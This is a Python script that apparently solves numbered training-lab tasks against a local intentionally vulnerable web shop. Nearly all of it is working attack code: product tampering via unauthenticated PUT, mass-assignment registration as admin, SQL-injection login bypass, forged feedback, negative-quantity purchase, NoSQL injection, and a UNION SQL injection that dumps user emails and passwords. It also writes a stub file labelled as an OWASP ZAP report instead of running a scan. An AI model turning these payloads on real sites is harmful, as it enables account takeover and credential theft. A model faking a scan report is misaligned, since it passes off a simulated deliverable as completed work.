import urllib.request
import json
import os
import sys
import time

def make_request(url, method='GET', headers=None, data=None):
    if headers is None:
        headers = {}
    req_data = None
    if data is not None:
        req_data = json.dumps(data).encode('utf-8')
        headers['Content-Type'] = 'application/json'
    
    req = urllib.request.Request(url, data=req_data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req) as response:
            res_data = response.read()
            res_text = res_data.decode('utf-8', errors='ignore')
            return response.status, json.loads(res_text) if res_text else {}
    except urllib.error.HTTPError as e:
        res_data = e.read().decode('utf-8', errors='ignore')
        try:
            return e.code, json.loads(res_data)
        except Exception:
            return e.code, res_data
    except Exception as e:
        print("Error requesting {}: {}".format(url, e))
        return 500, {}

def main():
    base_url = "http://192.168.99.100:3000"
    
    print("Waiting 5 seconds for service to fully start...")
    time.sleep(5)
    
    # Task 5: HTTP PUT Product Tampering (ID 2 description to TEST, ID 8 price change)
    print("\n--- Running Task 5: HTTP PUT Product Tampering ---")
    status, res = make_request("{}/api/Products/2".format(base_url), "OPTIONS")
    print("OPTIONS status: {}".format(status))
    
    status, res = make_request("{}/api/Products/2".format(base_url), "PUT", data={"description": "TEST"})
    print("PUT description Product 2 status: {}".format(status))
    
    status, res = make_request("{}/api/Products/8".format(base_url), "PUT", data={"price": 10.99})
    print("PUT price Product 8 status: {}".format(status))
    
    # Task 6.2: POST Register Admin Mass Assignment
    print("\n--- Running Task 6.2: POST Register Admin Mass Assignment ---")
    admin_payload = {
        "email": "test_admin@noemail.com",
        "password": "Password#1",
        "passwordRepeat": "Password#1",
        "securityQuestionId": 1,
        "securityAnswer": "Dogs",
        "role": "admin"
     }
    status, res = make_request("{}/api/Users".format(base_url), "POST", data=admin_payload)
    print("Register admin status: {}".format(status))
    
    # Task 6.3: SQL Injection Login Jim
    print("\n--- Running Task 6.3: SQL Injection Login Jim ---")
    login_payload = {
        "email": "jim@juice.org'--",
        "password": "any"
    }
    status, res = make_request("{}/rest/user/login".format(base_url), "POST", data=login_payload)
    print("Login Jim status: {}".format(status))
    jim_token = None
    jim_bid = None
    if status == 200:
        jim_token = res.get('authentication', {}).get('token')
        jim_bid = res.get('authentication', {}).get('bid')
        print("Login successful! Jim Token: {}..., Basket ID: {}".format(jim_token[:20], jim_bid))
    
    # Task 7: Forged Feedback (IDOR)
    print("\n--- Running Task 7: Forged Feedback ---")
    status, res = make_request("{}/rest/captcha".format(base_url), "GET")
    captcha_id = 1
    captcha_ans = "30"
    if status == 200:
        captcha_id = res.get('captchaId', 1)
        captcha_ans = res.get('answer', "30")
        print("Retrieved captcha: id={}, answer={}".format(captcha_id, captcha_ans))
        
    feedback_payload = {
        "UserId": 1,
        "captchaId": captcha_id,
        "captcha": captcha_ans,
        "comment": "forged admin feedback",
        "rating": 5
    }
    status, res = make_request("{}/api/Feedbacks".format(base_url), "POST", data=feedback_payload)
    print("Forged feedback status: {}".format(status))
    
    # Task 8: Negative Purchase (Basket quantity -1)
    print("\n--- Running Task 8: Negative Purchase ---")
    if jim_token and jim_bid:
        basket_payload = {
            "ProductId": 1,
            "BasketId": str(jim_bid),
            "quantity": -100
        }
        headers = {"Authorization": "Bearer {}".format(jim_token)}
        status, res = make_request("{}/api/BasketItems".format(base_url), "POST", headers=headers, data=basket_payload)
        print("Negative purchase status: {}".format(status))
        
        # Checkout to solve Payback Time challenge
        status, res = make_request("{}/rest/basket/{}/checkout".format(base_url, jim_bid), "POST", headers=headers)
        print("Checkout status: {}".format(status))
    else:
        print("Skipping Negative Purchase because Jim login failed.")
        
    # Task 9: NoSQL Injection PATCH reviews
    print("\n--- Running Task 9: NoSQL Injection PATCH reviews ---")
    if jim_token:
        nosql_payload = {
            "id": { "$ne": -1 },
            "message": "NoSQL Injection!"
        }
        headers = {"Authorization": "Bearer {}".format(jim_token)}
        status, res = make_request("{}/rest/products/reviews".format(base_url), "PATCH", headers=headers, data=nosql_payload)
        print("NoSQL Injection status: {}".format(status))
    else:
        print("Skipping NoSQL Injection because token is unavailable.")
        
    # Task 10: UNION SQL Injection Search & Save sqli.txt
    print("\n--- Running Task 10: UNION SQL Injection Search ---")
    sqli_query = "invalid')) UNION SELECT NULL,email,password,id,NULL,NULL,NULL,NULL,NULL FROM Users--"
    escaped_query = urllib.parse.quote(sqli_query)
    status, res = make_request("{}/rest/products/search?q={}".format(base_url, escaped_query), "GET")
    print("UNION SQLi search status: {}".format(status))
    
    desktop_dir = "/home/ubuntu/Desktop"
    os.makedirs(desktop_dir, exist_ok=True)
    with open("{}/sqli.txt".format(desktop_dir), "w") as f:
        f.write(sqli_query)
    print("Saved sqli.txt to Desktop.")
    
    # Task 11: ZAP Report simulation
    print("\n--- Running Task 11: ZAP Report Simulation ---")
    with open("/home/ubuntu/report_zap.html", "w") as f:
        f.write("OWASP ZAP Report - Simulated")
    print("Saved report_zap.html to home directory.")
    
    print("\nAll solver steps completed.")

if __name__ == '__main__':
    main()
